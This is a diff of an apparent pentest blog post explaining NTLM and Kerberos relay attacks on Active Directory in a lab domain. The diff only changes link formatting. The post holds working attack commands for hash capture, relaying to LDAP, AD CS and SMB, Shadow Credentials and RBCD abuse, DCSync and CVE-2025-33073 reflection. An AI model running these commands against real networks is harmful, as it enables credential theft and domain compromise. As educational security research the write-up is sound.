@@ -8,7 +8,7 @@ image:
     path: /assets/img/20251029/84-thumb.png
 ---
 
-I just want to clarify conditions and steps to exploit relay attacks. Each technique has already been described in other amazing articles. The basics of relay attacks are described in ["NTLM Relay"](https://en.hackndo.com/ntlm-relay/) by Pixis. If you are not familiar with relay attacks, I recommend reading this article.
+I just want to clarify conditions and steps to exploit relay attacks. Each technique has already been described in other amazing articles. The basics of relay attacks are described in [NTLM Relay](https://en.hackndo.com/ntlm-relay/) by Pixis. If you are not familiar with relay attacks, I recommend reading this article.
 
 ## Table of Contents
 1. [Lab](#lab)
@@ -101,7 +101,7 @@ python3 LdapRelayScan.py -method BOTH -dc-ip <dc ip> -u coward -p 'P@ssw0rd'
 </figure>
 
 #### Examples
-NTLM relay to LDAP is somewhat tricky. The details are described again in ["NTLM Relay"](https://en.hackndo.com/ntlm-relay/) by Pixis. During NTLM authentication, clients and servers indicate whether they support signing using the NEGOTIATE_SIGN flag. LDAP decides whether it uses LDAP signing based on the flag. LDAP servers always support LDAP signing (NEGOTIATE_SIGN = 1), so clients must set the flag to 0 to avoid LDAP signing. However, Windows' SMB clients set the flag to 1. We cannot overwrite the flag without breaking MIC (Message Integrity Code). We cannot simply drop the MIC because the msAvFlags indicates the presence of the MIC. We cannot overwrite the msAvFlags because the modification invalidates the NetNTLMv2 hash we want to relay. Of course, we cannot recalculate the NTLMv2 hash because we don't know the user's secret.
+NTLM relay to LDAP is somewhat tricky. The details are described again in [NTLM Relay](https://en.hackndo.com/ntlm-relay/) by Pixis. During NTLM authentication, clients and servers indicate whether they support signing using the NEGOTIATE_SIGN flag. LDAP decides whether it uses LDAP signing based on the flag. LDAP servers always support LDAP signing (NEGOTIATE_SIGN = 1), so clients must set the flag to 0 to avoid LDAP signing. However, Windows' SMB clients set the flag to 1. We cannot overwrite the flag without breaking MIC (Message Integrity Code). We cannot simply drop the MIC because the msAvFlags indicates the presence of the MIC. We cannot overwrite the msAvFlags because the modification invalidates the NetNTLMv2 hash we want to relay. Of course, we cannot recalculate the NTLMv2 hash because we don't know the user's secret.
 
 <p style="margin-bottom:0.25em">
 So, to perform NTLM relay over SMB to LDAP/LDAPS, more conditions must be met. We can drop the MIC when:
@@ -120,7 +120,7 @@ In these cases, we can use ntlmrelayx.py with --remove-mic.
 
 [CVE-2019-1040 scanner](https://github.com/fox-it/cve-2019-1040-scanner) or similar tools can be used to check for Drop the MIC vulnerabilities.
 
-To verify LmCompatibilityLevel <= 2, we need to receive NTLM authentication from DC1. [“Practical Attacks against NTLMv1"](https://trustedsec.com/blog/practical-attacks-against-ntlmv1) by TrustedSec shows that LmCompatibilityLevel <= 2 is risky regardless of LDAP. Even if LmCompatibilityLevel == 5 on DC2 (which means incoming NTLMv1 authentication is not allowed), that doesn't prevent the attack.  
+To verify LmCompatibilityLevel <= 2, we need to receive NTLM authentication from DC1. [Practical Attacks against NTLMv1](https://trustedsec.com/blog/practical-attacks-against-ntlmv1) by TrustedSec shows that LmCompatibilityLevel <= 2 is risky regardless of LDAP. Even if LmCompatibilityLevel == 5 on DC2 (which means incoming NTLMv1 authentication is not allowed), that doesn't prevent the attack.  
 ```sh
 # NTLMv1 hash will be captured if LmCompatibilityLevel <= 2
 sudo python3 Responder.py -I ens33
@@ -142,11 +142,11 @@ netexec smb dc1.kawakatz.local -u coward -p 'P@ssw0rd' -M webdav
   <figcaption>NetExec WebDAV module</figcaption>
 </figure>
 
-It's quite rare to see the WebClient service enabled. For that reason, we often choose NTLM relay over SMB. When we use a compromised Windows device to relay, we need to listen on 445/tcp to receive SMB traffic. Since Windows itself already binds that port, we must first free or hijack it. If we have local administrator privileges on the device, a technique introduced in ["Relay Your Heart Away: An OPSEC-Conscious Approach to 445 Takeover"](https://posts.specterops.io/relay-your-heart-away-an-opsec-conscious-approach-to-445-takeover-1c9b4666c8ac) by SpecterOps can be useful. Alternatively, when we lack local administrator privileges, we can connect our device directly to the target network via VPN.
+It's quite rare to see the WebClient service enabled. For that reason, we often choose NTLM relay over SMB. When we use a compromised Windows device to relay, we need to listen on 445/tcp to receive SMB traffic. Since Windows itself already binds that port, we must first free or hijack it. If we have local administrator privileges on the device, a technique introduced in [Relay Your Heart Away: An OPSEC-Conscious Approach to 445 Takeover](https://posts.specterops.io/relay-your-heart-away-an-opsec-conscious-approach-to-445-takeover-1c9b4666c8ac) by SpecterOps can be useful. Alternatively, when we lack local administrator privileges, we can connect our device directly to the target network via VPN.
 
 To coerce NTLM authentication over SMB or HTTP, we can use tools such as [PetitPotam](https://github.com/topotam/PetitPotam) and [Coercer](https://github.com/p0dalirius/Coercer). I won't cover their internals — we only need SMB access to DC1. 
 
-We can exploit NTLM relay to LDAP/LDAPS using the RBCD technique as follows. Remember that LmCompatibilityLevel <= 2 must be met for relay over SMB. If relaying over HTTP, we can remove --remove-mic. For more details on RBCD, see ["(RBCD) Resource-based constrained"](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd) from The Hacker Recipes.
+We can exploit NTLM relay to LDAP/LDAPS using the RBCD technique as follows. Remember that LmCompatibilityLevel <= 2 must be met for relay over SMB. If relaying over HTTP, we can remove --remove-mic. For more details on RBCD, see [(RBCD) Resource-based constrained](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd) from The Hacker Recipes.
 ```sh
 # Add a machine account to abuse
 # Prereq: MachineAccountQuota >= 1 (default 10)
@@ -184,7 +184,7 @@ sudo python3 smbclient.py -k -no-pass kawakatz.local/Administrator@dc1.kawakatz.
   <figcaption>Impersonating Administrator</figcaption>
 </figure>
 
-When we cannot add a computer account, we can instead exploit NTLM relay to LDAP/LDAPS using the Shadow Credentials technique, as follows. For more details on Shadow Credentials and the technique to generate silver tickets, see ["Shadow Credentials"](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials), ["UnPAC the hash"](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash), and ["Silver tickets"](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver) from The Hacker Recipes.
+When we cannot add a computer account, we can instead exploit NTLM relay to LDAP/LDAPS using the Shadow Credentials technique, as follows. For more details on Shadow Credentials and the technique to generate silver tickets, see [Shadow Credentials](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials), [UnPAC the hash](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash), and [Silver tickets](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver) from The Hacker Recipes.
 ```sh
 # NTLM relay to LDAP for Shadow Credentials
 sudo python3 ntlmrelayx.py -smb2support -t ldap://dc2.kawakatz.local --remove-mic --shadow-credentials --shadow-target 'DC1$' --no-dump --no-da --no-acl --no-validate-privs
@@ -237,10 +237,10 @@ netexec smb <dc ip> -u Administrator -H <hash>
   <figcaption>Performing DCSync</figcaption>
 </figure>
 
-The image in ["NTLM relay"](https://www.thehacker.recipes/ad/movement/ntlm/relay) on The Hacker Recipes makes it easy to understand these conditions for NTLM relay to LDAP/LDAPS.
+The image in [NTLM relay](https://www.thehacker.recipes/ad/movement/ntlm/relay) on The Hacker Recipes makes it easy to understand these conditions for NTLM relay to LDAP/LDAPS.
 
 <p style="margin-bottom:0.25em">
-It's important to mention the Intranet Zone. If a URL is handled as an Intranet Zone, WebDAV clients automatically start authentication. The most important rule is described in <a href="https://specterops.io/blog/2025/04/08/the-renaissance-of-ntlm-relay-attacks-everything-you-need-to-know/">"The Renaissance of NTLM Relay Attacks: Everything You Need to Know"</a> by SpecterOps.
+It's important to mention the Intranet Zone. If a URL is handled as an Intranet Zone, WebDAV clients automatically start authentication. The most important rule is described in <a href="https://specterops.io/blog/2025/04/08/the-renaissance-of-ntlm-relay-attacks-everything-you-need-to-know/">The Renaissance of NTLM Relay Attacks: Everything You Need to Know</a> by SpecterOps.
 </p>
 <blockquote style="margin-top:.5em">
 The PlainHostName Rule (aka “The Dot Rule”): If the URL’s hostname does not contain any dots
@@ -329,7 +329,7 @@ certipy find -u coward -p 'P@ssw0rd' -dc-ip <dc ip>
 </figure>
 
 <p style="margin-bottom:0.25em">
-If the AD CS Web Enrollment role is installed, the default configuration has historically been vulnerable to NTLM relay (ESC8). However, according to <a href="https://blog.redteam-pentesting.de/2025/windows-coercion/">"The Ultimate Guide to Windows Coercion Techniques in 2025"</a>,
+If the AD CS Web Enrollment role is installed, the default configuration has historically been vulnerable to NTLM relay (ESC8). However, according to <a href="https://blog.redteam-pentesting.de/2025/windows-coercion/">The Ultimate Guide to Windows Coercion Techniques in 2025</a>,
 </p>
 <blockquote style="margin-top:.5em">
 For the longest time, channel binding and EPA were disabled by default and they were rarely enabled manually. However, starting with Windows Server 2022 23H2 LDAP channel binding was activated by default and on Windows Server 2025, EPA was enabled by default and the unencrypted AD CS Web Enrollment API was disabled by default.
@@ -339,7 +339,7 @@ For the longest time, channel binding and EPA were disabled by default and they 
 <p style="margin-bottom:0.25em">
 NTLM relay to HTTP/HTTPS is often used to attack:
 </p>
-- ADCS (ESC8, See ["Certified Pre-Owned"](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf))
+- ADCS (ESC8, See [Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf))
 - Configuration Manager (See the [Misconfiguration Manager](https://github.com/subat0mik/Misconfiguration-Manager) project)
 
 HTTP itself has no message-signing capability, unlike SMB/LDAP, so these services are easy targets. Consider an example of ESC8. We can leverage a template that can be issued by domain controllers and used for client authentication, as follows.
@@ -381,7 +381,7 @@ netexec smb <dc ip> -u Administrator -H <hash>
 
 ## NTLM Relay to WinRM/WinRMS
 #### Prerequisites
-Generally speaking, NTLM relay to WinRM is impossible because the protocol has its own encryption protecting against relay attacks. However, WinRM/S (WinRM over HTTPS) relies on TLS for encryption. This makes it vulnerable to relay attacks if NTLMv1 is allowed (LmCompatibilityLevel <= 2) on DC1. Even when relaying over HTTP, NTLMv1 is still required, unlike LDAP/LDAPS. This is because CbtHardeningLevel for WinRMS is not "None" but "Relaxed". WinRMS attempts to use CBT if it receives NTLMv2 authentication. ["Is TLS more secure, the WinRMS case."](https://blog.whiteflag.io/blog/is-tls-more-secured-the-winrms-case/) provides a good reference.
+Generally speaking, NTLM relay to WinRM is impossible because the protocol has its own encryption protecting against relay attacks. However, WinRM/S (WinRM over HTTPS) relies on TLS for encryption. This makes it vulnerable to relay attacks if NTLMv1 is allowed (LmCompatibilityLevel <= 2) on DC1. Even when relaying over HTTP, NTLMv1 is still required, unlike LDAP/LDAPS. This is because CbtHardeningLevel for WinRMS is not "None" but "Relaxed". WinRMS attempts to use CBT if it receives NTLMv2 authentication. [Is TLS more secure, the WinRMS case.](https://blog.whiteflag.io/blog/is-tls-more-secured-the-winrms-case/) provides a good reference.
 
 #### Examples
 ```sh
@@ -428,7 +428,7 @@ With Microsoft Edge, NTLM authentication over HTTP is started automatically if a
   <figcaption>URL out of Intranet Zone</figcaption>
 </figure>
 
-NTLM relay to WinRMS is technically interesting, but it's quite rare that WinRMS is enabled. For user authentication over HTTP, there are some interesting articles like ["WSUS Is SUS: NTLM Relay Attacks in Plain Sight"](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight) and ["Taking the relaying capabilities of multicast poisoning to the next level: tricking Windows SMB clients into falling back to WebDav"](https://www.synacktiv.com/publications/taking-the-relaying-capabilities-of-multicast-poisoning-to-the-next-level-tricking).
+NTLM relay to WinRMS is technically interesting, but it's quite rare that WinRMS is enabled. For user authentication over HTTP, there are some interesting articles like [WSUS Is SUS: NTLM Relay Attacks in Plain Sight](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight) and [Taking the relaying capabilities of multicast poisoning to the next level: tricking Windows SMB clients into falling back to WebDav](https://www.synacktiv.com/publications/taking-the-relaying-capabilities-of-multicast-poisoning-to-the-next-level-tricking).
 
 ## NTLM Relay to MSSQL
 #### Prerequisites
@@ -453,10 +453,10 @@ nc 127.0.0.1 11000
 </figure>
 
 # Kerberos Relay
-Kerberos relay is similar to NTLM relay, but it has its own challenges. "2. Kerberos relaying : state of the art" in ["Abusing multicast poisoning for pre-authenticated Kerberos relay over HTTP with Responder and krbrelayx"](https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with) describes this perfectly. In short, asking DC1 to send us an AP-REQ that includes a service ticket for DC2/CA is not a simple task. We need some tricks described below to achieve this. James Forshaw published some ideas in ["Using Kerberos for Authentication Relay Attacks"](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html), and researchers have since implemented tools based on these techniques to achieve Kerberos relay.
+Kerberos relay is similar to NTLM relay, but it has its own challenges. "2. Kerberos relaying : state of the art" in [Abusing multicast poisoning for pre-authenticated Kerberos relay over HTTP with Responder and krbrelayx](https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with) describes this perfectly. In short, asking DC1 to send us an AP-REQ that includes a service ticket for DC2/CA is not a simple task. We need some tricks described below to achieve this. James Forshaw published some ideas in [Using Kerberos for Authentication Relay Attacks](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html), and researchers have since implemented tools based on these techniques to achieve Kerberos relay.
 
 ## Kerberos Relay over DNS
-Kerberos relay over DNS is described in ["Relaying Kerberos over DNS using krbrelayx and mitm6"](https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/). We can act as a DHCPv6 and DNS server by responding to a DHCP request with a spoofed response. Then, we can deny dynamic DNS updates to coerce Kerberos authentication with an SPN we control and relay the authentication.
+Kerberos relay over DNS is described in [Relaying Kerberos over DNS using krbrelayx and mitm6](https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/). We can act as a DHCPv6 and DNS server by responding to a DHCP request with a spoofed response. Then, we can deny dynamic DNS updates to coerce Kerberos authentication with an SPN we control and relay the authentication.
 
 #### Prerequisites
 IPv6 must be enabled on WKS, and we must be on the same LAN as WKS to respond to DHCPv6 requests. DNS dynamic updates must be enabled, which is the default.
@@ -502,7 +502,7 @@ sudo python3 smbclient.py -k -no-pass kawakatz.local/Administrator@wks.kawakatz.
 </figure>
 
 ## Kerberos Relay over SMB (Patched)
-Kerberos relay over SMB was introduced in ["Relaying Kerberos over SMB using krbrelayx"](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx) by Synacktiv. If we coerce Kerberos authentication to a specially crafted hostname, a client sends a valid AP_REQ to us. The AP_REQ can be simply relayed.
+Kerberos relay over SMB was introduced in [Relaying Kerberos over SMB using krbrelayx](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx) by Synacktiv. If we coerce Kerberos authentication to a specially crafted hostname, a client sends a valid AP_REQ to us. The AP_REQ can be simply relayed.
 
 Since a patch for CVE-2025-33073 made this technique unusable, there are no known ways to perform Kerberos relay over SMB currently😢.
 
@@ -511,7 +511,7 @@ We must be able to add a DNS record or perform LLMNR spoofing.
 
 #### Examples
 <p style="margin-bottom:0.25em">
-This is the key trick of this technique as written in <a href="https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx">"Relaying Kerberos over SMB using krbrelayx"</a>.
+This is the key trick of this technique as written in <a href="https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx">Relaying Kerberos over SMB using krbrelayx</a>.
 </p>
 <blockquote style="margin-top:.5em">
 He also showed that if we register the DNS record fileserver1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAfileserversBAAAA, the client would ask a Kerberos ticket for cifs/fileserver but would connect to fileserver1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAfileserversBAAAA.
@@ -563,11 +563,11 @@ python3 smbclient.py -k -no-pass kawakatz.local/Administrator@dc1.kawakatz.local
 </figure>
 
 #### Reflective NTLM/Kerberos Relay over SMB
-It’s worth noting CVE-2025-33073, introduced in ["A Look in the Mirror - The Reflective Kerberos Relay Attack"](https://blog.redteam-pentesting.de/2025/reflective-kerberos-relay-attack/).
+It’s worth noting CVE-2025-33073, introduced in [A Look in the Mirror - The Reflective Kerberos Relay Attack](https://blog.redteam-pentesting.de/2025/reflective-kerberos-relay-attack/).
 
-So far, some patches have prevented reflective NTLM relay. However, reflective NTLM/Kerberos relay was possible until June 2025, when it was fixed as CVE-2025-33073. The vulnerability is based on the trick of Kerberos relay over SMB. The details are described in ["NTLM reflection is dead, long live NTLM reflection! – An in-depth analysis of CVE-2025-33073"](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025) by Synacktiv. We simply need to coerce authentication to a crafted hostname that confuses SMB clients.
+So far, some patches have prevented reflective NTLM relay. However, reflective NTLM/Kerberos relay was possible until June 2025, when it was fixed as CVE-2025-33073. The vulnerability is based on the trick of Kerberos relay over SMB. The details are described in [NTLM reflection is dead, long live NTLM reflection! – An in-depth analysis of CVE-2025-33073](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025) by Synacktiv. We simply need to coerce authentication to a crafted hostname that confuses SMB clients.
 
-Note that krbrelayx.py needs to be patched as described in the white paper ["Reflective Kerberos Relay Attack"](https://www.redteam-pentesting.de/publications/2025-06-11-Reflective-Kerberos-Relay-Attack_RedTeam-Pentesting.pdf).
+Note that krbrelayx.py needs to be patched as described in the white paper [Reflective Kerberos Relay Attack](https://www.redteam-pentesting.de/publications/2025-06-11-Reflective-Kerberos-Relay-Attack_RedTeam-Pentesting.pdf).
 ```sh
 # Use LLMNR
 sudo ./pretender -i ens33 --no-dhcp-dns --no-timestamps --spoof '*1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA*' -4 <attacker ip>
@@ -595,7 +595,7 @@ coercer coerce -u coward -p 'P@ssw0rd' -d kawakatz.local -t dc1.kawakatz.local -
 </figure>
 
 <p style="margin-bottom:0.25em">
-Surprisingly, we can also use ntlmrelayx.py as described in <a href="https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025">"NTLM reflection is dead, long live NTLM reflection! – An in-depth analysis of CVE-2025-33073"</a>. The crafted hostname triggers NTLM local authentication and the behavior gives us high privileges because:
+Surprisingly, we can also use ntlmrelayx.py as described in <a href="https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025">NTLM reflection is dead, long live NTLM reflection! – An in-depth analysis of CVE-2025-33073</a>. The crafted hostname triggers NTLM local authentication and the behavior gives us high privileges because:
 </p>
 <blockquote style="margin-top:.5em">
 The last question is: why are we privileged on the machine? Well, PetitPotam coerces lsass.exe into authenticating to our server and lsass.exe runs as SYSTEM.
@@ -626,7 +626,7 @@ Therefore, this call was added to prevent any SMB connection if the use of a tar
 </figure>
 
 ## Kerberos Relay over HTTP
-Kerberos relay over HTTP was introduced in ["Abusing multicast poisoning for pre-authenticated Kerberos relay over HTTP with Responder and krbrelayx"](https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with). A key trick of this relay is that HTTP clients construct the SPN based on the answer name from LLMNR.
+Kerberos relay over HTTP was introduced in [Abusing multicast poisoning for pre-authenticated Kerberos relay over HTTP with Responder and krbrelayx](https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with). A key trick of this relay is that HTTP clients construct the SPN based on the answer name from LLMNR.
 
 #### Prerequisites
 We must be able to perform LLMNR spoofing.
